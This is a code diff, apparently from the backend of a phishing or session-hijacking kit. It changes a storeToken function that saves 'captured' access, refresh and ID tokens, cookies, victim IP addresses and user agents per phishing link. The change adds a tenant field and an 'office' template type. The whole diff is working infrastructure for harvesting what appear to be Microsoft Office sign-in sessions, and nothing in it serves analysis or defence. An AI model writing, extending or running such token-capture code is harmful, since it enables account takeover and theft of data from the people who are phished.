@@ -327,9 +327,22 @@ async function storeToken(job, tokenData, responseCookies = []) {
       cookiesEncrypted = encrypt(cookieStrings);
     }
 
+    // Determine tenant from jwt_payload or default
+    let tenant = 'common';
+    try {
+      if (job.jwtToken) {
+        const decoded = jwt.verify(job.jwtToken, config.JWT_SECRET);
+        const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ? AND user_id = ?', [decoded.link_id, decoded.user_id]);
+        if (links.length && links[0].jwt_payload) {
+          const parsed = JSON.parse(links[0].jwt_payload);
+          if (parsed.tenant) tenant = parsed.tenant;
+        }
+      }
+    } catch (e) { /* use default */ }
+
     const [result] = await db.query(
-      `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration)
-       VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))`,
+      `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type)
+       VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?)`,
       [
         job.user_id,
         job.link_id,
@@ -340,6 +353,8 @@ async function storeToken(job, tokenData, responseCookies = []) {
         cookiesEncrypted,
         ipAddress,
         userAgent,
+        tenant,
+        'office',
       ]
     );
 
